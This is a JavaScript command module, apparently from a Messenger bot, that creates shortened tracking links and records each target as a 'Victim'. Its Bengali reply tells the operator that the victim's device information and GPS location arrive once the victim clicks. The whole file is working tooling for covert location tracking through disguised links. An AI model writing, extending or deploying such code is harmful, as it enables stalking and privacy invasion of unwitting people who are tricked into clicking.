const { nanoid } = require('nanoid');
const Victim = require('../models/Victim');
const { getConfig, sendMessage, shortenUrl } = require('../utils/helpers');

module.exports = {
    execute: async (senderId, args, sendMessage) => {
        try {
            const config = await getConfig();
            const baseUrl = config.baseUrl || 'http://localhost:3000';

            const id = nanoid(10);
            const longLink = `${baseUrl}/l/${id}`;
            const shortLink = await shortenUrl(longLink);

            const victim = new Victim({
                id: id,
                fbId: senderId,
                type: 'location',
                shortLink: shortLink,
                timestamp: new Date(),
                status: 'pending'
            });
            await victim.save();

            await sendMessage(senderId, `✅ *লোকেশন লিংক তৈরি করা হলো!*\n\n🔗 শর্ট লিংক: ${shortLink}\n🔗 আসল লিংক: ${longLink}\n\nভিক্টিম ক্লিক করলে ডিভাইস ইনফো + লোকেশন (GPS) আসবে।`);
        } catch (err) {
            console.error('❌ Location command error:', err);
            await sendMessage(senderId, '❌ লিংক তৈরি করতে ব্যর্থ: ' + err.message);
        }
    }
};